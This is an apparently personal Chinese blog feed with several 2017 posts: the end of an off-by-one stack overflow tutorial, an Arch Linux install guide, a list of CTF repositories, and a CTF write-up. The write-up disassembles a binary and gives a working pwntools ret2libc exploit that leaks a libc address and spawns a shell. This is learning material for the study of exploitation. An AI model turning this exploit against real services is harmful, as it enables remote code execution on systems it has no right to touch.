<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> <span class="token number">0xffffcae0</span> <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span> 我们的esp应该在这里
main_ebp
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
foo的局部变量
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
ret2foo
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
err_foo_ebp
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token number">256</span>字节缓冲区  <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span> 而事实上我们的esp现在在这里面不知道哪个地方
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
bar其他局部变量
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样的话,只要我们构造一个合理的输入数据,就可以造成任意地址返回了,这里我们先不考虑地址随机化,这个时候我们拿出来传说中的<code>pattern_create</code>造一个256字符的数据把产生的数据喂给程序,跑一下</p>
<p>然后在程序走到foo的ret时候就可以看到,栈里的数据,把这个数据拷出来,用<code>pattern_offset</code>搞一下就知道是在跳到了我们这256字节的哪里了,或者等程序崩了,也会有提示</p>
<p>其实在其他情况下,这里也可能不在我们控制范围内,因为,也可能正好跳到原<code>ret2main</code>和我们可控的这256字节缓冲区之间对吧,不过可能性比较小</p>
<p>具体操作一下<br>产生256字节pattern然后给程序</p>
<p>片刻之后,程序崩溃了</p>
<pre class="line-numbers language-c"><code class="language-c">Stopped reason<span class="token punctuation">:</span> SIGSEGV
<span class="token number">0x61414145</span> in <span class="token operator">?</span><span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>定位一下</p>
<pre class="line-numbers language-c"><code class="language-c">gdb<span class="token operator">-</span>peda$ pattern_offset <span class="token number">0x61414145</span>
<span class="token number">1631666501</span> found at offset<span class="token punctuation">:</span> <span class="token number">36</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>改一下payload再给程序</p>
<pre class="line-numbers language-c"><code class="language-c">print <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">36</span> <span class="token operator">+</span> <span class="token string">'BCDE'</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> <span class="token number">36</span> <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token string">'A'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>因为我们这里没有具体的跳转地址,就把目标地址定为’BCDE’<br>可以看到我们的程序在崩溃的时候到了这个地方</p>
<pre class="line-numbers language-c"><code class="language-c">Stopped reason<span class="token punctuation">:</span> SIGSEGV
<span class="token number">0x45444342</span> in <span class="token operator">?</span><span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>测试成功</p>
<h2 id="不能off-by-one"><a href="#不能off-by-one" class="headerlink" title="不能off-by-one"></a>不能off-by-one</h2><p>作者提到两种情况不能像这样子利用<code>off-by-one</code></p>
<ol>
<li>Some other local variable might be present above the destination buffer.<br>就是说我们的<code>buf</code>不是紧挨着<code>ebp</code>的中间还有其他变量,因为我们只能覆盖一字节,所以就无能为力了<pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> arg<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* [1] */</span>
<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* [2] */</span> 
<span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* [3] */</span> 
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>Alignment space<br>可能gcc会默认出现内存对齐到16字节….,这个时候在我们的buf和ebp之间就还是有空隙了</li>
</ol>
<pre class="line-numbers language-c"><code class="language-c">Dump of assembler code <span class="token keyword">for</span> function main<span class="token punctuation">:</span>
 <span class="token number">0x08048497</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span><span class="token punctuation">:</span> push <span class="token operator">%</span>ebp
 <span class="token number">0x08048498</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">></span><span class="token punctuation">:</span> mov <span class="token operator">%</span>esp<span class="token punctuation">,</span><span class="token operator">%</span>ebp
 <span class="token number">0x0804849a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">3</span><span class="token operator">></span><span class="token punctuation">:</span> push <span class="token operator">%</span>edi
 <span class="token number">0x0804849b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token punctuation">:</span> and $<span class="token number">0xfffffff0</span><span class="token punctuation">,</span><span class="token operator">%</span>esp               <span class="token comment" spellcheck="true">//Stack space aligned to 16 byte boundary</span>
 <span class="token number">0x0804849e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token punctuation">:</span> sub $<span class="token number">0x20</span><span class="token punctuation">,</span><span class="token operator">%</span>esp                     <span class="token comment" spellcheck="true">//create stack space</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>原文中为了确保不出现这种情况,我们编译时候加入参数让他对齐到四字节<code>-mpreferred-stack-boundary=2</code></p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安装Arch Linux]]></title>
      <url>/2017/07/24/%E5%AE%89%E8%A3%85Arch-Linux/</url>
      <content type="html"><![CDATA[<p>docker没搞好,所以安装了一下arch,安装的速度炒鸡快,感觉以后临时用可以用它<br>是在我ubuntu下的VMware下装的,没空间了,只划了两个G,装完占用1.5G左右<br>而且整个都是mbr传统启动方式</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>准备当然是ustc的mirror那里download了一张x86_64的arch的iso<br>丢到虚拟机里,启动,等待</p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>由于虚拟机,我直接开了NAT,所以直接有网,不过还是执行了下<code>dhcpcd</code>,忘了看不跑着一条,能不能自己获取到ip</p>
<h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">fdisk</span> /dev/sda
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>进入交互环境</p>
<pre class="line-numbers language-bash"><code class="language-bash">o 新建分区表
n 建立新分区
然后一路回车
最后
w 把更改写入磁盘
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><pre class="line-numbers language-bash"><code class="language-bash">mkfs.ext4 /dev/sda
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mount</span> /dev/sda /mnt
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先把ustc的源加到最前面</p>
<pre class="line-numbers language-bash"><code class="language-bash">vim /etc/pacman.d/mirrorlist

<span class="token comment" spellcheck="true">## China</span>
Server <span class="token operator">=</span> http://mirrors.ustc.edu.cn/archlinux/<span class="token variable">$repo</span>/os/<span class="token variable">$arch</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后安装安装</p>
<pre class="line-numbers language-bash"><code class="language-bash">pacstrap /mnt base base-devel
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>安装完之后看看我们的<code>/mnt</code>多了很多东西</p>
<h3 id="自动挂载"><a href="#自动挂载" class="headerlink" title="自动挂载"></a>自动挂载</h3><pre class="line-numbers language-bash"><code class="language-bash">genfstab -L /mnt <span class="token operator">>></span> /mnt/etc/fstab
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个我不太懂,大概就是下次不需要手动挂载了</p>
<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><pre class="line-numbers language-bash"><code class="language-bash">arch-chroot /mnt
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个是把原来的<code>/mnt</code>变成了根目录</p>
<p>安装grub2</p>
<pre class="line-numbers language-bash"><code class="language-bash">pacman -S grub
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>把grub安装到硬盘</p>
<pre class="line-numbers language-bash"><code class="language-bash">grub-install --target<span class="token operator">=</span>i386-pc /dev/sda --force
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里<code>i386-pc</code>是说传统mbr启动,不是UEFI</p>
<p>生成配置文件</p>
<pre class="line-numbers language-bash"><code class="language-bash">grub-mkconfig -o /boot/grub/grub.cfg
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">passwd</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="好了-重启重启"><a href="#好了-重启重启" class="headerlink" title="好了,重启重启"></a>好了,重启重启</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">reboot</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><pre class="line-numbers language-bash"><code class="language-bash">pacman -S net-tools  <span class="token comment" spellcheck="true"># ifconfig route</span>
pacman -S dnsutils  <span class="token comment" spellcheck="true"># dig nslookup </span>
pacman -S netcat
pacman -S socat
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[收集pwn题目]]></title>
      <url>/2017/07/23/%E6%94%B6%E9%9B%86pwn%E9%A2%98%E7%9B%AE/</url>
      <content type="html"><![CDATA[<p>想要学习pwn,发现没有题目TAT<br>然后到xctf oj上面发现pwn的都已经下载不了了<br>后来惊喜的发现有一些大佬把自己做过的比赛题目存下来了,记一下</p>
<ol>
<li><a href="https://github.com/Hcamael/CTF_repo" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo</a></li>
<li><a href="https://github.com/o0xmuhe/PwnableLog" target="_blank" rel="external">https://github.com/o0xmuhe/PwnableLog</a></li>
<li><a href="https://github.com/sixstars/CTF" target="_blank" rel="external">https://github.com/sixstars/CTF</a></li>
<li><a href="https://github.com/Winter3un/ctf_task" target="_blank" rel="external">https://github.com/Winter3un/ctf_task</a></li>
</ol>
<p>后面这个大佬一个人屯了好多题,一大箩筐,真可怕</p>
<ol>
<li><a href="https://github.com/Trietptm-on-Security/Pwnables-solutions" target="_blank" rel="external">https://github.com/Trietptm-on-Security/Pwnables-solutions</a></li>
<li><a href="https://github.com/p4-team/ctf" target="_blank" rel="external">https://github.com/p4-team/ctf</a></li>
</ol>
<p>差不多就这些</p>
<p>还有HCTF 2016 <a href="https://github.com/vidar-team/HCTF2016" target="_blank" rel="external">https://github.com/vidar-team/HCTF2016</a></p>
]]></content>
      
        <categories>
            
            <category> 备忘 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[从负开始学汇编1]]></title>
      <url>/2017/07/23/%E4%BB%8E%E8%B4%9F%E5%BC%80%E5%A7%8B%E5%AD%A6%E6%B1%87%E7%BC%961/</url>
      <content type="html"><![CDATA[<h2 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h2><p>直接把main函数所有代码亮出来</p>
<pre class="line-numbers language-asm"><code class="language-asm">=> 0x8048594:    push   ebp
   0x8048595:    mov    ebp,esp
   0x8048597:    and    esp,0xfffffff0
   0x804859a:    sub    esp,0x10
   0x804859d:    mov    DWORD PTR [esp],0x1
   0x80485a4:    call   0x8048400 <alarm@plt>

   0x80485a9:    mov    eax,ds:0x804a044
   0x80485ae:    mov    DWORD PTR [esp+0x4],0x0
   0x80485b6:    mov    DWORD PTR [esp],eax
   0x80485b9:    call   0x80483e0 <setbuf@plt>

   0x80485be:    mov    eax,ds:0x804a060
   0x80485c3:    mov    DWORD PTR [esp+0x4],0x0
   0x80485cb:    mov    DWORD PTR [esp],eax
   0x80485ce:    call   0x80483e0 <setbuf@plt>

   0x80485d3:    mov    eax,ds:0x804a040
   0x80485d8:    mov    DWORD PTR [esp+0x4],0x0
   0x80485e0:    mov    DWORD PTR [esp],eax
   0x80485e3:    call   0x80483e0 <setbuf@plt>

   0x80485e8:    mov    DWORD PTR [esp],0x8048690
   0x80485ef:    call   0x8048410 <puts@plt>

   0x80485f4:    call   0x804854d
   0x80485f9:    mov    eax,0x0
   0x80485fe:    leave  
   0x80485ff:    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>程序大体就是</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">sefbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">sub_804854d</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个前面没什么hack点,我们跳到<code>sub_804854d</code>里面</p>
<pre class="line-numbers language-asm"><code class="language-asm">   0x804854d:    push   ebp
   0x804854e:    mov    ebp,esp
   0x8048550:    sub    esp,0x98
   0x8048556:    mov    DWORD PTR [esp+0x8],0x100    ;0x100
   0x804855e:    lea    eax,[ebp-0x88]   ; buffer_addr
   0x8048564:    mov    DWORD PTR [esp+0x4],eax
   0x8048568:    mov    DWORD PTR [esp],0x0  ; 0x0
   0x804856f:    call   0x80483f0 <read@plt> ; read(0, [ebp -0x88], 0x100)

   0x8048574:    mov    DWORD PTR [esp+0x8],0x100 ;0x100
   0x804857c:    lea    eax,[ebp-0x88]   
   0x8048582:    mov    DWORD PTR [esp+0x4],eax  ; buffer_addr
   0x8048586:    mov    DWORD PTR [esp],0x1  ; 0x1
   0x804858d:    call   0x8048440 <write@plt>    ; write(1, [ebp - 0x88], 0x100)

   0x8048592:    leave  ; mov esp, ebp; pop ebp
   0x8048593:    ret
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里先把栈抬高了0x98,靠近栈顶<code>esp</code>的0x10个用来放等下要调用<code>read</code>和<code>write</code>的三个形参(3* 4 = 0x10), 靠近栈基的<code>0x88</code>个字节作为缓冲区,这个时候read第三个参数是0x100 &gt; 0x88这就造成了后面的栈溢出</p>
<p>我们<code>checksec</code>的结果是,只开启了<code>NX</code>,数据段不可执行,所以我们可以使用ret2libc<br>我们的思路是利用read栈溢出,覆盖<code>sub_804854d</code>的返回地址,让他指向<code>&lt;write@plt&gt;</code>,就可以调用write来打印出内存中glibc某个函数的地址,以后来后面通过偏移算出<code>system</code>和<code>/bin/sh</code>在内存中的位置,然后让<code>&lt;write@plt&gt;</code>再次返回到<code>sub_804854d</code>,这一次我们就可以在此栈溢出,并返回到<code>system(&#39;/bin/sh&#39;)</code></p>
<pre class="line-numbers language-c"><code class="language-c">   <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => 写入内容大概是 'A' * 0x88 + 'BBBB' + &lt;write@plt> + ret_addr_of_write + arg1 + arg2 + arg3</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>write@got<span class="token operator">></span><span class="token punctuation">,</span> <span class="token number">0x4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => get到加载好的glibc中的write地址, 参数就是上面的arg1~3</span>
<span class="token operator">=</span><span class="token operator">></span> sub_804854d  <span class="token comment" spellcheck="true">// 就是上面填好的ret_addr_of_write</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// => 写入内容大概是 'A' * 0x88 + 'BBBB' + system + ret_addr_of_system + /bin/sh</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个再注意一下,想调用某个库函数只要传入<code>&lt;xxx@plt&gt;</code>就可以了,只有要算偏移的时候,要得到库函数具体加载位置才必须要使用<code>&lt;xxx@got&gt;</code></p>
<h2 id="写payload"><a href="#写payload" class="headerlink" title="写payload"></a>写payload</h2><p>遇到了好多问题,就是recv,recvline的问题,等会说</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding: utf8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

debug <span class="token operator">=</span> <span class="token number">0</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'pwn1'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> debug <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#    context.terminal = ['gnome-terminal','-x','sh','-c']</span>
<span class="token comment" spellcheck="true">#    gdb.attach(p)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span>


plt_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> <span class="token string">'plt_write='</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>plt_write<span class="token punctuation">)</span>
got_write <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> <span class="token string">'got_write='</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>

vuln_addr <span class="token operator">=</span> <span class="token number">0x0804854d</span>
buffer_len <span class="token operator">=</span> <span class="token number">0x88</span>

payload1  <span class="token operator">=</span> <span class="token string">''</span>
payload1 <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> buffer_len 
payload1 <span class="token operator">+=</span> <span class="token string">'BBBB'</span> <span class="token comment" spellcheck="true"># ebp</span>

payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>plt_write<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ret_addr</span>
payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># write ret to vuln_function</span>

<span class="token comment" spellcheck="true">#args of write</span>
payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>got_write<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>


p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 坑点在这里,原题目使用了一次puts,puts是自带换行的,必须用p.recvline()</span>
p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 你要先接受0x100字节的输出,是来自write(1, buf, 0x100)</span>
<span class="token comment" spellcheck="true"># 你虽然read没写这么多数据,但他会write这么多,开始这里就错了</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 这个时候才可以接收</span>
resp <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
<span class="token keyword">print</span> <span class="token string">'write_addr='</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true"># 计算偏移地址</span>
system_addr <span class="token operator">=</span> write_addr <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
sh_addr     <span class="token operator">=</span> write_addr <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">-</span> next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>

payload2  <span class="token operator">=</span> <span class="token string">''</span>
payload2 <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> buffer_len 
payload2 <span class="token operator">+=</span> <span class="token string">'BBBB'</span> <span class="token comment" spellcheck="true"># ebp</span>
payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ret_addr</span>

payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 起来shell后返回到哪里已经不重要了,这里可以瞎填</span>
payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># arg of system</span>

p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第一个问题就是<code>p.recv全系列</code></p>
<blockquote>
<p>recv(numb = 4096, timeout = default) → str<br>    Receives up to numb bytes of data from the tube, and returns as soon as any quantity of data is available.<br>    If the request is not satisfied before timeout seconds pass, all data is buffered and an empty string (‘’) is returned.<br>    如果达不到n个字节那将什么都得不到,那要是我的numb设置的太小呢</p>
<p>recvline(keepends = True) → str<br>    A “line” is any sequence of bytes terminated by the byte sequence set in newline, which defaults to ‘\n’.<br>    If the request is not satisfied before timeout seconds pass, all data is buffered and an empty string (‘’) is returned.<br>    如果返回的数据没有<code>\n</code>那用了<code>recvline</code>讲什么都得不到,而不是得到一部分</p>
<p>recvuntil(delims, timeout = default) → str<br>    Receive data until one of delims is encountered.<br>    If the request is not satisfied before timeout seconds pass, all data is buffered and an empty string (‘’) is returned.</p>
<p>注意:all data is buffered</p>
</blockquote>
<p>第二个问题是题目三次setbuf,就像原来自己写的程序,用到的输入输出函数,只有在遇到换行或者xxx情况才刷新缓冲区,这里不需要,所以这里的给<code>read</code>上payload的时候只要<code>p.send(payload)</code>就可以了,而不需要<code>p.sendline(payload)</code>是这个原因吗</p>
<p>第三个问题是题目开了<code>alarm(1)</code>, 1s后程序就会<code>exited on signal 14</code>,这个手根本没办法,所以把最后几行改成</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里用了<code>p.sendline()</code>,是和命令行交互的时候,还是不太懂要不要line</p>
<h2 id="gdb常用操作"><a href="#gdb常用操作" class="headerlink" title="gdb常用操作"></a>gdb常用操作</h2><p>start 启动程序,并且停在main的第一句</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[从负开始学汇编0]]></title>
      <url>/2017/07/22/%E4%BB%8E%E8%B4%9F%E5%BC%80%E5%A7%8B%E5%AD%A6%E6%B1%87%E7%BC%960/</url>
      <content type="html"><![CDATA[<h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><p>一句一句看一下昨天的pwn1,超简单,几行代码的</p>
<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><pre class="line-numbers language-asm"><code class="language-asm">push    ebp
 mov    ebp, esp
 and    esp, 0FFFFFFF0h     ; 这里是对齐esp到16字节
 sub    esp, 10h            ; 抬高栈顶,相当于分配了16字节空间
 mov    dword ptr [esp], 1  ; 像栈里推入4字节 0x1,相当于push 1
 call   _alarm              ; 调用函数alarm(1), 1是上一步分的
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我拿gdb调试的时候</p>
<p>我们暂停一下,这个时候的栈应该是</p>
<p>到了and这句之前</p>
<pre class="line-numbers language-asm"><code class="language-asm">EBP: 0xffffcbe8
ESP: 0xffffcbe8
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>and之后</p>
<pre class="line-numbers language-asm"><code class="language-asm">EBP: 0xffffcbe8
